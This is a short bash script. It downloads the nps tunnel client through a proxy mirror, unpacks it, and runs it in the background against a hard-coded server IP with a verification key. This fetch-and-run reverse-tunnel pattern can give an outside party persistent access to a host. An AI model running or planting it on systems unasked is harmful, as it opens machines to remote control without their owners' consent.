#!/bin/bash
wget https://it.kp.al/https://github.com/ehang-io/nps/releases/download/v0.26.10/linux_386_client.tar.gz
tar xzvf linux_386_client.tar.gz
chmod +x npc
./npc -server=3.0.21.88:8024 -vkey=iot3rdfc6e2x3xct -type=tcp &